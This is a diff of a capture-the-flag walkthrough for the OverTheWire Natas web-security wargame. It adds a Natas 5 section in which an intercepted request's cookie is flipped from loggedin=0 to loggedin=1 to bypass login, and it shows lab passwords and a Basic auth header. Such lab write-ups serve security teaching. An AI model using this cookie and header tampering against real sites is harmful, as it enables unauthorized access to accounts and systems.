@@ -16,16 +16,6 @@ Here is my walkthrough of each level. If you would like to jump to specific leve
 ## Natas 0
 [http://natas0.natas.labs.overthewire.org](http://natas0.natas.labs.overthewire.org)
 
-In their website they give us the username and password for natas0.
-
-> **Username:** natas0
-> **Password:** natas0
-
----
-
-## Natas 0 → 1 
-[http://natas0.natas.labs.overthewire.org](http://natas0.natas.labs.overthewire.org)
-
 It says it’s on this page, but we don’t see it, do we? 
 
 ![](https://i.imgur.com/oDDaBDv.png)
@@ -43,7 +33,7 @@ That's our password. Easy!
 
 ---
 
-## Natas 1 → 2 
+## Natas 1
 [http://natas1.natas.labs.overthewire.org](http://natas1.natas.labs.overthewire.org)
 
 We need to view the source but we can't because right-clicking is blocked.
@@ -70,7 +60,7 @@ Fairly similar to the last challenge.
 
 ---
 
-## Natas 2 → 3 
+## Natas 2
 [http://natas2.natas.labs.overthewire.org](http://natas2.natas.labs.overthewire.org)
 
 Nothing on the page?
@@ -112,7 +102,7 @@ mallory:9urtcpzBmH
 
 ---
 
-## Natas 3 → 4 
+## Natas 3
 [http://natas3.natas.labs.overthewire.org](http://natas3.natas.labs.overthewire.org)
 
 Nothing on the page?
@@ -195,7 +185,7 @@ natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
 
 ---
 
-## Natas 4 → 5 
+## Natas 4
 [http://natas4.natas.labs.overthewire.org](http://natas4.natas.labs.overthewire.org)
 
 On successfully logging in the natas4 webpage, we will have a message in front of us. It says “Access disallowed. You are visiting from “” while authorized users should come only from “//natas5.natas.labs.overthewire.org/” ”as shown in the figure given below.
@@ -218,3 +208,42 @@ After Forwarding the Request, we get the credentials of the user natas5.
 > **Password:** iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
 
 ---
+
+## Natas 5
+[http://natas5.natas.labs.overthewire.org](http://natas5.natas.labs.overthewire.org)
+
+`You're not loggedin`
+
+We need to trick the server into thinking we are logged in.
+
+Let's intercept with Burp Suite.
+
+```
+GET / HTTP/1.1
+Host: natas5.natas.labs.overthewire.org
+Cache-Control: max-age=0
+Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: loggedin=0
+Connection: close
+```
+
+The line we're specifally interested in is...
+
+`Cookie: loggedin=0`
+
+Let's change that value to `1`
+
+`Cookie: loggedin=1`
+
+After Forwarding the Request, we get the credentials of the user natas6.
+
+![](https://i.imgur.com/z13g0Jn.png)
+
+> **Username:** natas6
+> **Password:** aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
